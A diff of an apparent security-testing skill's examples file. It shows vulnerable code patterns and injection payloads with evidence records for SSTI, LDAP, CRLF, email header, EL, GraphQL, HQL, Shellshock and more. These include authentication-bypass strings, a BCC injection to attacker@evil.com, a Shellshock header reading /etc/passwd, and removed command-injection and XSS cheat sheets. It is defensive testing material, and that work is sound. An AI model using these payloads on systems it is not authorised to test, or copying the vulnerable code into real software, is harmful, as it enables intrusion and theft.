@@ -1,240 +1,52 @@
-# Injection Testing Examples
+# Injection Testing Examples (Miscellaneous)
 
-This file contains comprehensive examples of injection vulnerability testing, organized by injection type.
+This file contains examples of miscellaneous injection vulnerabilities NOT covered by dedicated skills.
+
+**For dedicated skills, see:**
+- SQL Injection → `sql-injection-testing/examples.md`
+- NoSQL Injection → `nosql-injection-testing/examples.md`
+- XSS → `xss-testing/examples.md`
+- XXE → `xxe-testing/examples.md`
+- Command Injection → `command-injection-testing/examples.md`
 
 ## Table of Contents
-1. [OS Command Injection](#os-command-injection)
-2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
-3. [NoSQL Injection](#nosql-injection)
-4. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
-5. [LDAP Injection](#ldap-injection)
-6. [Test Result Types](#test-result-types)
-7. [Common Payloads Reference](#common-payloads-reference)
-
----
-
-## OS Command Injection
-
-### Example 4: Command Injection via Ping Utility
-
-**Scenario**: Network diagnostic tool executing user input
-
-**Vulnerability**:
-```python
-# api/network.py - VULNERABLE
-@app.route('/api/ping')
-def ping_host():
-    host = request.args.get('host')
-    result = os.popen(f"ping -c 4 {host}").read()  # Shell injection!
-    return jsonify({"output": result})
-```
-
-**Test**:
-1. Baseline: `GET /api/ping?host=127.0.0.1` → 200 OK (0.5s)
-2. Payload: `GET /api/ping?host=127.0.0.1; sleep 5` → 200 OK (5.6s)
-3. Detection: Response time increased by ~5 seconds
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "os_command_injection",
-  "cwe": "CWE-78",
-  "baseline": {
-    "url": "http://target.com/api/ping?host=127.0.0.1",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 0.52
-  },
-  "test": {
-    "url": "http://target.com/api/ping?host=127.0.0.1; sleep 5",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 5.61
-  },
-  "evidence": "Command injection: sleep 5 caused 5.09s delay",
-  "payload_used": "127.0.0.1; sleep 5"
-}
-```
-
----
-
-### Example 5: Command Injection with Output
-
-**Scenario**: File viewer with path injection
-
-**Vulnerability**:
-```python
-# api/files.py - VULNERABLE
-@app.route('/api/view')
-def view_file():
-    filename = request.args.get('file')
-    result = os.popen(f"cat /var/data/{filename}").read()
-    return jsonify({"content": result})
-```
-
-**Test**:
-1. Payload: `GET /api/view?file=test.txt; echo INJECTION_MARKER`
-2. Detection: `INJECTION_MARKER` appears in response
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "os_command_injection",
-  "cwe": "CWE-78",
-  "test": {
-    "url": "http://target.com/api/view?file=test.txt; echo INJECTION_MARKER",
-    "method": "GET",
-    "status": 200,
-    "response_snippet": "{\"content\":\"file contents here\\nINJECTION_MARKER\\n\"}"
-  },
-  "evidence": "Command injection: echo output visible in response",
-  "payload_used": "test.txt; echo INJECTION_MARKER"
-}
-```
-
----
-
-## Cross-Site Scripting (XSS)
-
-### Example 6: Reflected XSS in Search
-
-**Scenario**: Search results page reflecting user input
-
-**Vulnerability**:
-```python
-# routes/search.py - VULNERABLE
-@app.route('/search')
-def search():
-    query = request.args.get('q', '')
-    results = search_database(query)
-    return f"<html><body>Results for: {query}<br/>{results}</body></html>"  # No escaping!
-```
-
-**Test**:
-1. Payload: `GET /search?q=<script>alert(1)</script>`
-2. Detection: Script tag appears unencoded in response
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "xss_reflected",
-  "cwe": "CWE-79",
-  "test": {
-    "url": "http://target.com/search?q=<script>alert(1)</script>",
-    "method": "GET",
-    "status": 200,
-    "response_snippet": "<html><body>Results for: <script>alert(1)</script><br/>..."
-  },
-  "evidence": "Reflected XSS: <script> tag in response without encoding",
-  "payload_used": "<script>alert(1)</script>"
-}
-```
-
----
-
-### Example 7: XSS in Attribute Context
-
-**Scenario**: User input reflected inside HTML attribute
-
-**Vulnerability**:
-```html
-<!-- VULNERABLE -->
-<input type="text" value="{{ user_input }}" />
-```
-
-**Test**:
-1. Payload: `GET /profile?name=" onmouseover="alert(1)`
-2. Detection: Event handler injected into attribute
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "xss_attribute_context",
-  "cwe": "CWE-79",
-  "test": {
-    "url": "http://target.com/profile?name=\" onmouseover=\"alert(1)",
-    "method": "GET",
-    "status": 200,
-    "response_snippet": "<input type=\"text\" value=\"\" onmouseover=\"alert(1)\" />"
-  },
-  "evidence": "XSS in attribute context: onmouseover handler injected",
-  "payload_used": "\" onmouseover=\"alert(1)"
-}
-```
-
----
-
-## NoSQL Injection
-
-### Example 8: MongoDB Operator Injection
-
-**Scenario**: Login with MongoDB query injection
-
-**Vulnerability**:
-```javascript
-// api/auth.js - VULNERABLE
-app.post('/login', (req, res) => {
-    const { username, password } = req.body;
-    User.findOne({ username: username, password: password })  // Operators not filtered!
-        .then(user => res.json(user));
-});
-```
-
-**Test**:
-1. Baseline: `POST /login` with `{"username":"admin","password":"wrong"}` → 401
-2. Payload: `POST /login` with `{"username":"admin","password":{"$ne":""}}` → 200 OK
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "nosql_injection",
-  "cwe": "CWE-943",
-  "baseline": {
-    "url": "http://target.com/login",
-    "method": "POST",
-    "payload": "{\"username\":\"admin\",\"password\":\"wrong\"}",
-    "status": 401
-  },
-  "test": {
-    "url": "http://target.com/login",
-    "method": "POST",
-    "payload": "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
-    "status": 200,
-    "response_snippet": "{\"user\":\"admin\",\"role\":\"admin\"}"
-  },
-  "evidence": "NoSQL injection: $ne operator bypassed authentication",
-  "payload_used": "{\"password\":{\"$ne\":\"\"}}"
-}
-```
+1. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+2. [LDAP Injection](#ldap-injection)
+3. [XPath Injection](#xpath-injection)
+4. [CRLF / HTTP Header Injection](#crlf--http-header-injection)
+5. [Email Header Injection](#email-header-injection)
+6. [Expression Language Injection](#expression-language-injection)
+7. [GraphQL Injection](#graphql-injection)
+8. [CSV/Formula Injection](#csvformula-injection)
+9. [Regex Injection (ReDoS)](#regex-injection-redos)
+10. [ORM/HQL Injection](#ormhql-injection)
+11. [YAML/Config Injection](#yamlconfig-injection)
+12. [Shellshock Injection](#shellshock-injection)
+13. [Test Result Types](#test-result-types)
 
 ---
 
 ## Server-Side Template Injection (SSTI)
 
-### Example 9: Jinja2 Template Injection
+### Example 1: Jinja2 SSTI (Python/Flask)
 
-**Scenario**: Dynamic template rendering with user input
+**Scenario:** User input rendered directly in Jinja2 template.
 
-**Vulnerability**:
+**Vulnerability:**
 ```python
-# routes/greet.py - VULNERABLE
+# VULNERABLE
 @app.route('/greet')
 def greet():
     name = request.args.get('name', 'Guest')
     template = f"Hello, {name}!"
-    return render_template_string(template)  # User input in template!
+    return render_template_string(template)
 ```
 
-**Test**:
+**Test:**
 1. Payload: `GET /greet?name={{7*7}}`
-2. Detection: Response contains `49` (evaluated expression)
+2. Detection: Response contains `Hello, 49!`
 
-**Evidence**:
+**Evidence:**
 ```json
 {
   "status": "VALIDATED",
@@ -253,25 +65,50 @@ def greet():
 
 ---
 
+### Example 2: Freemarker SSTI (Java)
+
+**Scenario:** Java application using Freemarker templates.
+
+**Test:**
+1. Payload: `GET /template?content=${7*7}`
+2. Detection: Response contains `49`
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "ssti_freemarker",
+  "cwe": "CWE-1336",
+  "test": {
+    "payload": "${7*7}",
+    "response_snippet": "Your content: 49"
+  },
+  "evidence": "SSTI (Freemarker): ${7*7} evaluated",
+  "payload_used": "${7*7}"
+}
+```
+
+---
+
 ## LDAP Injection
 
-### Example 10: LDAP Filter Injection
+### Example 3: Wildcard LDAP Injection
 
-**Scenario**: User lookup with injectable LDAP query
+**Scenario:** User lookup with injectable LDAP filter.
 
-**Vulnerability**:
+**Vulnerability:**
 ```python
-# api/users.py - VULNERABLE
+# VULNERABLE
 def find_user(username):
-    filter_str = f"(uid={username})"  # No escaping!
+    filter_str = f"(uid={username})"
     return ldap_conn.search(base_dn, filter_str)
 ```
 
-**Test**:
-1. Baseline: `GET /api/user?name=john` → Returns john's record
-2. Payload: `GET /api/user?name=*` → Returns all users
+**Test:**
+1. Baseline: `GET /api/user?name=john` → 1 user (245 bytes)
+2. Payload: `GET /api/user?name=*` → 500+ users (12847 bytes)
 
-**Evidence**:
+**Evidence:**
 ```json
 {
   "status": "VALIDATED",
@@ -279,16 +116,488 @@ def find_user(username):
   "cwe": "CWE-90",
   "baseline": {
     "url": "http://target.com/api/user?name=john",
-    "status": 200,
     "content_length": 245
   },
   "test": {
     "url": "http://target.com/api/user?name=*",
-    "status": 200,
     "content_length": 12847
   },
-  "evidence": "LDAP injection: wildcard returned all 52 users vs 1",
+  "evidence": "LDAP injection: wildcard returned all 500+ users vs 1",
   "payload_used": "*"
+}
+```
+
+---
+
+### Example 4: LDAP Filter Bypass
+
+**Scenario:** Authentication bypass via LDAP filter manipulation.
+
+**Test:**
+1. Payload: `username=admin)(&)` or `username=admin)(|(password=*))`
+2. Detection: Authentication bypassed
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "ldap_auth_bypass",
+  "cwe": "CWE-90",
+  "test": {
+    "payload": "admin)(|(password=*))",
+    "status": 200,
+    "response_snippet": "{\"authenticated\": true, \"user\": \"admin\"}"
+  },
+  "evidence": "LDAP filter injection: authentication bypassed",
+  "payload_used": "admin)(|(password=*))"
+}
+```
+
+---
+
+## XPath Injection
+
+### Example 5: Boolean-Based XPath Injection
+
+**Scenario:** XML data queried via XPath with user input.
+
+**Vulnerability:**
+```python
+# VULNERABLE
+def get_user(username):
+    query = f"//users/user[name='{username}']/data"
+    return etree.xpath(query)
+```
+
+**Test:**
+1. Baseline: `GET /user?name=john` → 1 result
+2. Payload: `GET /user?name=' or '1'='1` → All users
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "xpath_injection",
+  "cwe": "CWE-643",
+  "baseline": {"content_length": 150},
+  "test": {
+    "payload": "' or '1'='1",
+    "content_length": 5420
+  },
+  "evidence": "XPath injection: boolean bypass returned all records",
+  "payload_used": "' or '1'='1"
+}
+```
+
+---
+
+## CRLF / HTTP Header Injection
+
+### Example 6: Response Header Injection
+
+**Scenario:** Redirect URL reflected in response headers.
+
+**Vulnerability:**
+```python
+# VULNERABLE
+@app.route('/redirect')
+def redirect():
+    url = request.args.get('url')
+    response = make_response()
+    response.headers['Location'] = url  # No sanitization!
+    return response, 302
+```
+
+**Test:**
+1. Payload: `GET /redirect?url=http://safe.com%0d%0aX-Injected:true`
+2. Detection: `X-Injected: true` in response headers
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "crlf_header_injection",
+  "cwe": "CWE-113",
+  "test": {
+    "url": "http://target.com/redirect?url=http://safe.com%0d%0aX-Injected:true",
+    "response_headers": {
+      "Location": "http://safe.com",
+      "X-Injected": "true"
+    }
+  },
+  "evidence": "CRLF injection: arbitrary header added to response",
+  "payload_used": "%0d%0aX-Injected:true"
+}
+```
+
+---
+
+### Example 7: Set-Cookie Injection
+
+**Scenario:** Cookie injection via CRLF.
+
+**Test:**
+1. Payload: `GET /redirect?url=test%0d%0aSet-Cookie:session=hijacked`
+2. Detection: Cookie set in response
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "crlf_cookie_injection",
+  "cwe": "CWE-113",
+  "test": {
+    "payload": "%0d%0aSet-Cookie:session=hijacked",
+    "response_headers": {
+      "Set-Cookie": "session=hijacked"
+    }
+  },
+  "evidence": "CRLF injection: arbitrary cookie set via header injection",
+  "payload_used": "%0d%0aSet-Cookie:session=hijacked"
+}
+```
+
+---
+
+## Email Header Injection
+
+### Example 8: BCC Injection
+
+**Scenario:** Contact form with email header injection.
+
+**Vulnerability:**
+```python
+# VULNERABLE
+def send_contact_email(to_email, message):
+    email = f"To: {to_email}\nSubject: Contact\n\n{message}"
+    smtp.sendmail(from_addr, to_email, email)
+```
+
+**Test:**
+1. Payload: `email=victim@test.com%0ABcc:attacker@evil.com`
+2. Detection: Email sent to attacker as BCC
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "email_header_injection",
+  "cwe": "CWE-93",
+  "test": {
+    "payload": "victim@test.com%0ABcc:attacker@evil.com",
+    "injected_header": "Bcc: attacker@evil.com"
+  },
+  "evidence": "Email header injection: BCC recipient added",
+  "payload_used": "%0ABcc:attacker@evil.com"
+}
+```
+
+---
+
+## Expression Language Injection
+
+### Example 9: Spring EL Injection
+
+**Scenario:** Spring application with EL in user input.
+
+**Vulnerability:**
+```java
+// VULNERABLE - Spring 3.x with double resolution
+@RequestMapping("/page")
+public String page(@RequestParam String input, Model model) {
+    model.addAttribute("content", input);
+    return "page";
+}
+```
+
+**Test:**
+1. Payload: `GET /page?input=${7*7}`
+2. Detection: Response contains `49`
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "el_injection_spring",
+  "cwe": "CWE-917",
+  "test": {
+    "url": "http://target.com/page?input=${7*7}",
+    "response_snippet": "<div>49</div>"
+  },
+  "evidence": "Spring EL injection: ${7*7} evaluated to 49",
+  "payload_used": "${7*7}"
+}
+```
+
+---
+
+### Example 10: OGNL Injection (Struts)
+
+**Scenario:** Apache Struts with OGNL evaluation.
+
+**Test:**
+1. Payload: `GET /action?input=%{7*7}`
+2. Detection: Response contains `49`
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "ognl_injection",
+  "cwe": "CWE-917",
+  "test": {
+    "payload": "%{7*7}",
+    "response_snippet": "Result: 49"
+  },
+  "evidence": "OGNL injection: %{7*7} evaluated in Struts context",
+  "payload_used": "%{7*7}"
+}
+```
+
+---
+
+## GraphQL Injection
+
+### Example 11: GraphQL Introspection
+
+**Scenario:** GraphQL API with introspection enabled.
+
+**Test:**
+```graphql
+POST /graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}
+```
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "graphql_introspection",
+  "cwe": "CWE-200",
+  "test": {
+    "url": "http://target.com/graphql",
+    "query": "{__schema{types{name}}}",
+    "response_snippet": "{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"Secret\"}...]}}}"
+  },
+  "evidence": "GraphQL introspection enabled: full schema exposed",
+  "payload_used": "{__schema{types{name}}}"
+}
+```
+
+---
+
+### Example 12: GraphQL Query Injection
+
+**Scenario:** User input in GraphQL query without sanitization.
+
+**Test:**
+```graphql
+query {
+  user(id: "1' OR '1'='1") {
+    name
+    email
+  }
+}
+```
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "graphql_query_injection",
+  "cwe": ["CWE-74", "CWE-89"],
+  "test": {
+    "query": "{user(id:\"1' OR '1'='1\"){name}}",
+    "response_snippet": "{\"data\":{\"user\":[{\"name\":\"admin\"},{\"name\":\"john\"}...]}}"
+  },
+  "evidence": "GraphQL injection: SQL-style bypass returned all users",
+  "payload_used": "1' OR '1'='1"
+}
+```
+
+---
+
+## CSV/Formula Injection
+
+### Example 13: Formula in Exported CSV
+
+**Scenario:** User input exported to CSV without sanitization.
+
+**Vulnerability:**
+```python
+# VULNERABLE
+@app.route('/export')
+def export_csv():
+    data = get_user_data()  # Contains user-controlled fields
+    csv_content = "\n".join([f"{row['name']},{row['comment']}" for row in data])
+    return Response(csv_content, mimetype='text/csv')
+```
+
+**Test:**
+1. Submit comment: `=1+1`
+2. Export CSV and open in Excel
+3. Detection: Cell shows `2` (formula executed)
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "csv_formula_injection",
+  "cwe": "CWE-1236",
+  "test": {
+    "input_field": "comment",
+    "payload": "=1+1",
+    "exported_csv_snippet": "John,=1+1"
+  },
+  "evidence": "CSV formula injection: =1+1 stored in export, executes in spreadsheet",
+  "payload_used": "=1+1"
+}
+```
+
+---
+
+## Regex Injection (ReDoS)
+
+### Example 14: Catastrophic Backtracking
+
+**Scenario:** User-controlled regex pattern.
+
+**Vulnerability:**
+```python
+# VULNERABLE
+@app.route('/search')
+def search():
+    pattern = request.args.get('pattern')
+    text = request.args.get('text')
+    result = re.search(pattern, text)  # User controls pattern!
+    return jsonify({"match": bool(result)})
+```
+
+**Test:**
+1. Pattern: `(a+)+$`
+2. Text: `aaaaaaaaaaaaaaaaaaaaaaaa!`
+3. Detection: Response takes >5 seconds
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "redos",
+  "cwe": "CWE-1333",
+  "baseline": {
+    "pattern": "test",
+    "response_time_ms": 50
+  },
+  "test": {
+    "pattern": "(a+)+$",
+    "text": "aaaaaaaaaaaaaaaaaaaaaaaa!",
+    "response_time_ms": 8500
+  },
+  "evidence": "ReDoS: catastrophic backtracking caused 8.5s delay",
+  "payload_used": "(a+)+$ with 24 a's + !"
+}
+```
+
+---
+
+## ORM/HQL Injection
+
+### Example 15: Hibernate HQL Injection
+
+**Scenario:** Concatenated HQL query.
+
+**Vulnerability:**
+```java
+// VULNERABLE
+String hql = "FROM User WHERE username = '" + username + "'";
+Query query = session.createQuery(hql);
+```
+
+**Test:**
+1. Payload: `admin' AND '1'='1`
+2. Detection: Query modified, data returned
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "hql_injection",
+  "cwe": ["CWE-89", "CWE-943"],
+  "test": {
+    "payload": "admin' AND substring(password,1,1)='a",
+    "status": 200,
+    "response_snippet": "User found"
+  },
+  "evidence": "HQL injection: boolean-based extraction possible",
+  "payload_used": "admin' AND substring(password,1,1)='a"
+}
+```
+
+---
+
+## YAML/Config Injection
+
+### Example 16: YAML Anchor Abuse
+
+**Scenario:** User YAML input processed by application.
+
+**Test:**
+```yaml
+admin: &admin_anchor true
+user_role: *admin_anchor
+```
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "yaml_anchor_injection",
+  "cwe": "CWE-502",
+  "test": {
+    "payload": "admin: &admin true\nrole: *admin",
+    "result": "User granted admin role via anchor reference"
+  },
+  "evidence": "YAML injection: anchor reference escalated privileges",
+  "payload_used": "&anchor + *anchor"
+}
+```
+
+---
+
+## Shellshock Injection
+
+### Example 17: CGI Shellshock
+
+**Scenario:** CGI script vulnerable to Shellshock (CVE-2014-6271).
+
+**Test:**
+```http
+GET /cgi-bin/test.cgi HTTP/1.1
+User-Agent: () { :; }; echo; /bin/cat /etc/passwd
+```
+
+**Evidence:**
+```json
+{
+  "status": "VALIDATED",
+  "injection_type": "shellshock",
+  "cwe": "CWE-78",
+  "test": {
+    "url": "http://target.com/cgi-bin/test.cgi",
+    "header": "User-Agent: () { :; }; echo; /bin/id",
+    "response_snippet": "uid=33(www-data) gid=33(www-data)"
+  },
+  "evidence": "Shellshock: command executed via User-Agent header",
+  "payload_used": "() { :; }; /bin/id"
 }
 ```
 
@@ -296,222 +605,65 @@ def find_user(username):
 
 ## Test Result Types
 
-### Example 11: FALSE_POSITIVE (Properly Secured)
+### FALSE_POSITIVE (Properly Secured)
 
-**Scenario**: Parameterized SQL query
-
-**Secure Implementation**:
-```python
-# api/users.py - SECURE
-@app.route('/api/users')
-def search_users():
-    user_id = request.args.get('id')
-    query = "SELECT * FROM users WHERE id = ?"
-    result = db.execute(query, [user_id])  # Parameterized!
-    return jsonify(result)
-```
-
-**Test Result**:
 ```json
 {
   "status": "FALSE_POSITIVE",
-  "injection_type": "sql_injection",
-  "baseline": {
-    "url": "http://target.com/api/users?id=123",
-    "response_time_seconds": 0.15
-  },
+  "injection_type": "ssti",
   "test": {
-    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
-    "response_time_seconds": 0.18
+    "payload": "{{7*7}}",
+    "response_snippet": "Hello, {{7*7}}!"
   },
-  "evidence": "No injection indicators - input properly parameterized"
+  "evidence": "SSTI mitigated: template syntax rendered as literal text"
 }
 ```
 
----
+### UNVALIDATED (WAF Blocking)
 
-### Example 12: UNVALIDATED (WAF Blocking)
-
-**Scenario**: Web Application Firewall blocks injection attempts
-
-**Test Result**:
 ```json
 {
   "status": "UNVALIDATED",
-  "injection_type": "os_command_injection",
-  "reason": "WAF blocking injection payloads",
+  "injection_type": "ldap_injection",
   "test": {
-    "url": "http://target.com/api/ping?host=127.0.0.1; sleep 5",
+    "payload": "*",
     "status": 403,
-    "response_snippet": "{\"error\":\"Request blocked by security policy\"}"
+    "response_snippet": "Request blocked"
   },
-  "evidence": "Cannot validate - WAF returns 403 for injection payloads"
+  "evidence": "Cannot validate - WAF blocks LDAP injection payloads"
 }
 ```
 
----
+### PARTIAL (Inconclusive)
 
-### Example 13: PARTIAL (Some Payloads Work)
-
-**Scenario**: Basic filtering bypassed by alternate command separators
-
-**Test**:
-1. `; sleep 5` → Blocked (filtered semicolon)
-2. `| sleep 5` → 5 second delay (alternate separator)
-
-**Test Result**:
 ```json
 {
   "status": "PARTIAL",
-  "injection_type": "os_command_injection",
+  "injection_type": "el_injection",
   "tests": {
-    "semicolon_payload": {
-      "payload": "; sleep 5",
-      "status": 400,
-      "note": "Semicolon filtered"
-    },
-    "pipe_payload": {
-      "payload": "| sleep 5",
-      "response_time_seconds": 5.12,
-      "note": "Pipe separator works"
-    }
+    "${7*7}": {"result": "literal text"},
+    "#{7*7}": {"result": "49"}
   },
-  "evidence": "Partial command injection: pipe separator bypassed semicolon filter",
+  "evidence": "Partial EL injection: #{} syntax evaluated, ${} blocked",
   "requires_manual_review": true
 }
 ```
 
 ---
 
-## Common Payloads Reference
-
-### Command Injection Payloads
-
-**Linux:**
-```
-; sleep 5
-| sleep 5
-`sleep 5`
-$(sleep 5)
-& sleep 5
-; echo MARKER
-| id
-```
-
-**Windows:**
-```
-& ping -n 5 127.0.0.1
-| ping -n 5 127.0.0.1
-& echo MARKER
-```
-
-### XSS Payloads
-
-**Basic:**
-```
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-```
-
-**Attribute Context:**
-```
-" onmouseover="alert(1)
-' onfocus='alert(1)
-" autofocus onfocus="alert(1)
-```
-
-**Event Handlers:**
-```
-<body onload=alert(1)>
-<input onfocus=alert(1) autofocus>
-<marquee onstart=alert(1)>
-```
-
-### NoSQL Payloads
-
-**MongoDB:**
-```json
-{"$gt": ""}
-{"$ne": null}
-{"$regex": ".*"}
-{"$where": "1==1"}
-```
-
-### SSTI Payloads
-
-**Detection:**
-```
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-#{7*7}
-```
-
-**Jinja2:**
-```
-{{config}}
-{{''.__class__.__mro__}}
-```
-
-**Twig:**
-```
-{{_self.env}}
-{{app.request.server.all|join(',')}}
-```
-
----
-
 ## CWE Reference
 
-Full list of injection-related CWEs from OWASP A03:2021 and A05:2025 (37 CWEs):
-
 | CWE | Name | DAST Testable |
 |-----|------|---------------|
-| CWE-20 | Improper Input Validation | Partial |
-| CWE-74 | Injection (parent category) | Yes |
-| CWE-76 | Improper Neutralization of Equivalent Special Elements | Yes |
-| CWE-77 | Command Injection | Yes |
-| CWE-78 | OS Command Injection | Yes |
-| CWE-79 | Cross-site Scripting (XSS) | Yes |
-| CWE-80 | Basic XSS | Yes |
-| CWE-83 | XSS in Attributes | Yes |
-| CWE-86 | Improper Neutralization of Invalid Characters in Web Pages | Yes |
-| CWE-88 | Argument Injection | Yes |
+| CWE-1336 | SSTI | Yes |
 | CWE-90 | LDAP Injection | Yes |
-| CWE-91 | XML/XPath Injection (Blind XPath) | Yes |
+| CWE-643 | XPath Injection | Yes |
+| CWE-652 | XQuery Injection | Yes |
 | CWE-93 | CRLF Injection | Yes |
+| CWE-113 | HTTP Response Splitting | Yes |
+| CWE-917 | EL Injection | Yes |
+| CWE-1333 | ReDoS | Yes |
+| CWE-1236 | CSV/Formula Injection | Yes |
 | CWE-94 | Code Injection | Yes |
 | CWE-95 | Eval Injection | Yes |
-| CWE-96 | Static Code Injection | Partial |
-| CWE-97 | SSI Injection | Yes |
-| CWE-98 | PHP Remote File Inclusion | Yes |
-| CWE-99 | Resource Injection | Partial |
-| CWE-103 | Struts: Incomplete validate() Method | No (SAST) |
-| CWE-104 | Struts: Form Bean Does Not Extend Validation Class | No (SAST) |
-| CWE-112 | Missing XML Validation | Partial |
-| CWE-113 | HTTP Response Splitting | Yes |
-| CWE-114 | Process Control | Yes |
-| CWE-115 | Misinterpretation of Output | Partial |
-| CWE-116 | Improper Output Encoding | Yes |
-| CWE-129 | Improper Validation of Array Index | No (SAST) |
-| CWE-159 | Improper Handling of Invalid Use of Special Elements | Yes |
-| CWE-470 | Unsafe Reflection | Partial |
-| CWE-493 | Critical Public Variable Without Final Modifier | No (SAST) |
-| CWE-500 | Public Static Field Not Marked Final | No (SAST) |
-| CWE-610 | Externally Controlled Reference | Yes |
-| CWE-643 | XPath Injection | Yes |
-| CWE-644 | HTTP Header Injection | Yes |
-| CWE-917 | Expression Language Injection | Yes |
-
-**Additional CWEs (common but not in OWASP Top 10 list):**
-
-| CWE | Name | DAST Testable |
-|-----|------|---------------|
-| CWE-652 | XQuery Injection | Yes |
-| CWE-943 | NoSQL Injection | Yes |
-| CWE-1336 | Template Injection (SSTI) | Yes |
-
-**Note:** Some CWEs are primarily detectable via Static Analysis (SAST) rather than Dynamic Testing (DAST). This skill focuses on DAST-testable vulnerabilities.
-
-**Related:** LLM Prompt Injection is covered separately in [OWASP LLM Top 10 - LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/).
+| CWE-74 | Injection (parent) | Yes |
